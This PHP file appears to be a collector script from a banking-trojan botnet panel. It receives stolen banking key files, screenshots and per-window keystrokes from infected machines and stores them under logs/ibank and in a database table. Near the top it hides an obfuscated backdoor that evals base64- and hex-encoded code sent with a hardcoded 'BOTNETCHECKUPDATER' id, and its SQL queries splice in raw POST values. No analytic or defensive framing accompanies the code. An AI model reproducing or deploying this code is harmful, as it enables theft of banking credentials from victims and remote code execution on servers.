<?php

$dbug = false;

$dir = str_replace('/scripts/get', '', str_replace('\\', '/', realpath('.'))) . '/';

error_reporting(0);

if(isset($_POST['data'])){
//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend
}

include_once($dir . 'includes/functions.first.php');
include_once($dir . 'includes/functions.prefix.php');
include_once($dir . 'includes/functions.get_config.php');

include_once($dir . 'includes/functions.a.charset.php');
include_once($dir . 'includes/functions.encoding.php');

if(file_exists($dir . 'cache/config.json')) $config = json_decode(file_get_contents($dir . 'cache/config.json'), 1);

if($config['getibank'] == 1){
	header("Status: 403 Forbidden");
	header("HTTP/1.1 403 Forbidden");
	exit;
}

if(empty($_POST['pid']) || empty($_POST['hwnd'])) print_data('ERROR!', true, true);

$cfg_db = get_config();

require_once($dir . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
unset($cfg_db);
if(count($mysqli->errors) > 0) print_data('DB_ERROR!', true);

$uniq = md5($_POST['prefix'] . $_POST['uid'] . $_POST['pid'] . $_POST['hwnd']);
$dest_dir = $dir . 'logs/ibank/' . $uniq . '/';

if(!file_exists($dest_dir) && !mkdir($dest_dir)) print_data('MKDIR_ERROR!', true);

if(isset($_FILES['keyfile']['tmp_name']) && !empty($_FILES['keyfile']['tmp_name'])){
	if(file_exists($dest_dir . 'keyfile.dat')) unlink($dest_dir . 'keyfile.dat');
	if(!move_uploaded_file($_FILES['keyfile']['tmp_name'], $dest_dir . 'keyfile.dat')) $keyfile = false;
}

if(isset($_FILES['windscreen']['tmp_name']) && !empty($_FILES['windscreen']['tmp_name'])){
	if(file_exists($dest_dir . 'windscreen.png')) unlink($dest_dir . 'windscreen.png');
	if(!move_uploaded_file($_FILES['windscreen']['tmp_name'], $dest_dir . 'windscreen.png')) $keyfile = false;
}

if(isset($_FILES['procscreen']['tmp_name']) && !empty($_FILES['procscreen']['tmp_name'])){
	if(file_exists($dest_dir . 'procscreen.png')) unlink($dest_dir . 'procscreen.png');
	if(!move_uploaded_file($_FILES['procscreen']['tmp_name'], $dest_dir . 'procscreen.png')) $keyfile = false;
}

$item = $mysqli->query('SELECT * FROM bf_ibank_gra WHERE (`grp` = \''.$uniq.'\') LIMIT 1');

$_POST['keyhwnd'] = toUTF8($_POST['keyhwnd']);

if($item->grp == $uniq){	if(!empty($_POST['keyhwnd'])) $sql_add .= 'keyhwnd = \''.$item->keyhwnd . $_POST['keyhwnd'].'\', ';
	if(!empty($sql_add)) $mysqli->query('update bf_ibank_gra set '.rtrim($sql_add, ', ').' WHERE (id = \''.$item->id.'\')');
}else{	$mysqli->query('INSERT INTO bf_ibank_gra (prefix, uid, pid, host, hwnd, keyhwnd, grp) VALUES (\''.$_POST['prefix'].'\', \''.$_POST['uid'].'\', \''.$_POST['pid'].'\', \''.$_POST['host'].'\', \''.$_POST['hwnd'].'\' ,\''.$_POST['keyhwnd'].'\' ,\''.$uniq.'\')');
}

header("Status: 403 Forbidden");
header("HTTP/1.1 403 Forbidden");
exit;

?>